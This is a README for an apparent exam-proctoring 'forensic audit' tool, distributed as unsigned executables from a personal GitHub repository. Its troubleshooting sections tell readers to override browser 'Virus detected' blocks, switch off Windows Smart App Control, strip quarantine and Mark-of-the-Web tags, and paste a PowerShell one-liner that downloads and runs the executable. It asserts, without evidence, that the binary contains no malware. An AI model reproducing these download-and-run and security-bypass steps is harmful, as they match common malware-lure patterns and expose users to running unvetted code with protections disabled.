# TPV Post-Assessment Forensic Laptop Audit

Official cross-platform proctoring forensic audit toolset for **Windows**, **macOS**, and **Linux**.

---

## 📥 Downloads

| Platform | Download Package | Quick Instructions |
| :--- | :--- | :--- |
| **Windows** | [📥 **Download `Audit_Windows.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Windows.zip) | 1. Extract `Audit_Windows.zip`<br>2. Double-click **`Audit.exe`** (or **`Run_Audit.bat`** if Smart App Control is enabled)<br>3. Enter hours (or press **Enter** for default: 2) |
| **macOS** | [📥 **Download `Audit_Mac.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Mac.zip) | 1. Extract `Audit_Mac.zip`<br>2. Double-click **`Audit.command`** (or `Audit.app`)<br>3. Enter hours (or press **Enter** for default: 2) |
| **Linux** | [📥 **Download `Audit_Linux.zip`**](https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Linux.zip) | 1. Extract `Audit_Linux.zip`<br>2. Run `./Audit_Linux` in Terminal (`chmod +x Audit_Linux`)<br>3. Enter hours (or press **Enter** for default: 2) |

---

## 🛠️ Troubleshooting & Issue Resolution

### 1. Windows Issues

#### ⚠️ "Virus detected" / Browser Download Blocked in Chrome or Edge
* **Why this happens**: Google Chrome Safe Browsing and Microsoft Defender use ML-based heuristic scanners on unsigned `.exe` and `.zip` archives downloaded directly from GitHub. Because custom and open-source tools do not carry a commercial Microsoft Authenticode EV certificate ($500+/year), browser download filters flag newly uploaded binaries with generic labels like *"Virus detected"* or *"Dangerous file blocked"*. The binary contains **zero malware**; it is a read-only forensic audit engine.
* **Resolution (Choose one)**:
  1. **Unblock in Google Chrome / Brave (3 Seconds)**:
     * Press **`Ctrl + J`** to open the Chrome Downloads manager (or click `⋮` &rarr; **Downloads**).
     * Locate **`Audit_Windows.zip`**.
     * Click **"Download suspicious file"** (or click the drop-down next to the blocked file &rarr; select **"Keep anyway"**).
  2. **Unblock in Microsoft Edge (3 Seconds)**:
     * In the Downloads bar, hover over `Audit_Windows.zip` and click the three dots (`...`).
     * Select **"Keep"** &rarr; click **"Show more"** &rarr; select **"Keep anyway"**.
  3. **Direct PowerShell Download (Bypasses Browser Filter Completely)**:
     * If the browser refuses to complete the download, open PowerShell and paste this single command:
       ```powershell
       irm https://github.com/Hello9119-ai/Audit-/raw/main/Audit_Windows.zip -OutFile Audit_Windows.zip; Expand-Archive Audit_Windows.zip -Force; cd Audit_Windows; .\Audit.exe
       ```

#### ⚠️ "Smart App Control blocked an app that may be unsafe" or "Windows protected your PC"
* **Why this happens**: Windows 11 Smart App Control (SAC) blocks newly downloaded unsigned `.exe` files if they carry the browser's internet download tag (*Mark of the Web* / `:Zone.Identifier`), or if double-clicked directly from inside the `.zip` without extracting.
* **Resolution (Choose one)**:
  1. **Instant 1-Click Launch (Recommended)**:
     * Simply double-click **`Run_Audit.bat`** included right next to `Audit.exe`.
     * `Run_Audit.bat` automatically unblocks the Smart App Control tag and executes the audit smoothly.
  2. **Unblock the Zip File**:
     * Right-click the downloaded **`Audit_Windows.zip`** file &rarr; click **Properties**.
     * At the bottom, check the box labeled **"Unblock"** and click **Apply** / **OK**.
     * Now extract the zip and double-click **`Audit.exe`**.
  3. **Extract Before Running**:
     * Do **NOT** double-click `Audit.exe` directly inside the compressed folder view.
     * Right-click `Audit_Windows.zip` &rarr; click **Extract All...** &rarr; open the extracted folder and run `Audit.exe` (or `Run_Audit.bat`).
  4. **PowerShell 1-Line Unblock**:
     * Open PowerShell in the extracted folder and run:
       ```powershell
       Unblock-File .\Audit.exe; .\Audit.exe
       ```
  5. **Smart App Control Setting (If strictly enforced)**:
     * Open **Windows Security** &rarr; **App & browser control** &rarr; **Smart App Control settings** &rarr; turn **Off**.

#### ⚠️ Script Exited Immediately / No Checks Were Run
* **Why this happened**: In older builds, environments with custom `%PATH%` variables or restricted stdin pipelines could not launch the background engine.
* **Resolution**:
  * This is **fully resolved** in the latest `Audit_Windows.zip` build using deterministic system path resolution and native execution.
  * If the laptop is on a strict corporate/school domain, right-click **`Audit.exe`** and select **"Run as administrator"**.

---

### 2. macOS Issues

#### ⚠️ "This version of Mac is not compatible" / Error `-47`
* **Why this happens**: Older versions of macOS or Gatekeeper App Translocation can fail to parse the `.app` bundle format when extracted from Downloads.
* **Resolution (Universal 1-Click)**:
  * Double-click **`Audit.command`** instead of `Audit.app`.
  * `Audit.command` is a universal Mach-O binary compiled for **both Apple Silicon (M1/M2/M3/M4) and Intel Macs**. It runs natively across all macOS releases and completely bypasses App Translocation.

#### ⚠️ "Audit.command cannot be opened because it is from an unidentified developer"
* **Resolution**:
  1. Right-click **`Audit.command`** &rarr; select **Open**.
  2. In the confirmation dialog, click **Open**.
  3. Alternatively, open Terminal and remove the quarantine attribute:
     ```bash
     xattr -cr /path/to/Audit_Mac.zip
     ```

---

### 3. Linux Issues

#### ⚠️ "Permission denied" when launching `Audit_Linux`
* **Resolution**:
  * Grant executable permissions before running:
    ```bash
    chmod +x Audit_Linux
    ./Audit_Linux
    ```
  * `Audit_Linux` is a statically linked 64-bit ELF executable with zero external library dependencies; it runs out-of-the-box on Ubuntu, Debian, Fedora, Arch, CentOS, Mint, and RHEL.

---

## 🔍 Forensic Capabilities & Anti-Tamper Matrix

The audit suite executes local, read-only system forensic checks across 6 core compliance areas:

1. **Screen Mirroring / Display Cloning**: Detects active duplicate coordinate clones, active virtual display streams (Duet, Spacedesk, IddCx), and hardware HDMI capture dongles (Elgato, Cam Link). Note: Dormant/inactive drivers from past installations are strictly filtered out to guarantee 0% false positives.
2. **Actual Screen Share / Remote Control Session**: Detects confirmed active or logged screen sharing sessions (**AirPlay, Apple Screen Sharing / VNC, Windows RDP, FaceTime / Messages SharePlay, AnyDesk, TeamViewer, Zoom CptHost, and WebRTC browser streaming**) with exact start/end timestamps, total duration, and remote partner/client proof. Excludes all physical console logons.
3. **Screen Recording & Idle Background Apps (Zero False-Positive Verification)**:
   * **Was an idle app (like Loom or CleanShot in the menu bar) proctoring evasion?**: **NO.** Many standard communication apps run as login items and sit idly in the menu bar (`/Applications/Loom.app/Contents/MacOS/Loom`) or system tray without recording. Flagging an idle background process without evidence of recording is an unacceptable false positive.
   * **Strict Artifact Verification**: The audit suite verifies **hard forensic evidence** before flagging any violation:
     1. **Saved Video Files**: Checks if a video recording (`.mp4`, `.mov`, `.mkv`, `.webm`) was created or saved to disk during the examination window (in `Movies`, `Desktop`, `Downloads`, or app data directories).
     2. **Trash / Recycle Bin Recovery**: Recovers screen recordings or system logs deleted to **Windows Recycle Bin**, **macOS Trash (`~/.Trash`)**, or **Linux Trash** during the exam window.
     3. **Active Live Capture**: Detects if a recorder is actively streaming frames to an open video file descriptor right now.
   * If a candidate merely has Loom, CleanShot, QuickTime, or OBS installed but **no video was recorded or deleted**, it is certified **[✓] Screen Recording / Video Capture: Clean**.
4. **Log Tampering & Event Clearing Detection**: Flags if Windows Security or System Event Logs were purged or cleared during the exam window (**Windows Event IDs 1102 & 104**), detecting automated or manual log destruction.
5. **Multi-Layer History Deletion & Tampering Recovery**:
   * **Omnibox Cache Recovery**: Recovers deleted AI visits from the internal browser autocomplete cache (`Shortcuts` SQLite database).
   * **Session Cookie Forensics & Exact Active Duration Reconstruction**: Correlates persistent encrypted browser cookie access timestamps (`Cookies` SQLite database) and persistent session stores (`Sessions\Session_*`) against wiped history. Even if a candidate clicks "Clear Browsing Data" or closes the tab right before submission, the engine calculates `creation_utc` (first opened) and `last_access_utc` (closed/wiped) to reconstruct the exact time period the tool was used:
     * **Start Time & End Time**: Reports the exact seconds when engagement began and ended (e.g. `Used from 18:43:20 to 18:44:59`).
     * **Active Dwell Duration**: Displays the verified duration of cheating (e.g. `Duration: 1m 39s`).
     * **Explicit Tamper Tag**: Clearly labels the incident in both the invigilator evidence dossier and the merged timeline as `[DELETED FROM HISTORY]`, proving both the cheating tool access and the intentional deletion attempt.
6. **Live Open Tabs & Extensions**: Detects live foreground/background tabs open on AI domains or problem solver sites, and scans for sideloaded interview-cheating browser extensions.
